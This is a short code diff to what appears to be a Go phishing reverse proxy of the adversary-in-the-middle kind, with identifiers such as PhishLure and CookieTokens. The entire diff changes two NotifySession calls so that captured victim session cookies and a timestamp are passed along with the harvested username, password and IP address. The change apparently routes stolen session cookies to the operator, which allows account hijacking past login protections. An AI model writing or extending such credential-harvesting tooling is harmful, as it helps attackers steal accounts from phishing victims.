@@ -1050,7 +1050,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									lureIdx := p.cfg.GetLureIndexByPtr(s.PhishLure)
 									if lureIdx >= 0 {
 										hasTokens := len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0
-										NotifySession(lureIdx, s.Name, s.Username, s.Password, s.RemoteAddr, hasTokens)
+										NotifySession(lureIdx, s.Name, s.Username, s.Password, s.RemoteAddr, hasTokens, s.CookieTokens, time.Now().Unix())
 									}
 								}
 								break
@@ -1286,7 +1286,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							lureIdx := p.cfg.GetLureIndexByPtr(s.PhishLure)
 							if lureIdx >= 0 {
 								hasTokens := len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0
-								NotifySession(lureIdx, s.Name, s.Username, s.Password, s.RemoteAddr, hasTokens)
+								NotifySession(lureIdx, s.Name, s.Username, s.Password, s.RemoteAddr, hasTokens, s.CookieTokens, time.Now().Unix())
 							}
 						}
 
